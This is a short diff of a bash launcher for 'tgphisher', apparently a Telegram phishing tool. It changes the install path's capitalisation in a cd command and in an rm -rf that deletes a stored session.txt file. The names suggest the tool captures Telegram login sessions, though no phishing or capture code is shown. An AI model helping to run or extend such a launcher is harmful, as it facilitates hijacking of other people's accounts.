@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-cd /root/Tgphisher || { echo "Failed to enter the directory => /root/Tgphisher"; exit 1; }
+cd /root/tgphisher || { echo "Failed to enter the directory => /root/tgphisher"; exit 1; }
 
 tgphisher(){
   case "$1 $2" in
@@ -11,7 +11,7 @@ tgphisher(){
       server 
       ;;
     "-d session.txt")
-    rm -rf /root/Tgphisher/script/session.txt
+    rm -rf /root/tgphisher/script/session.txt
       ;;
     "-s --phisher")
       host
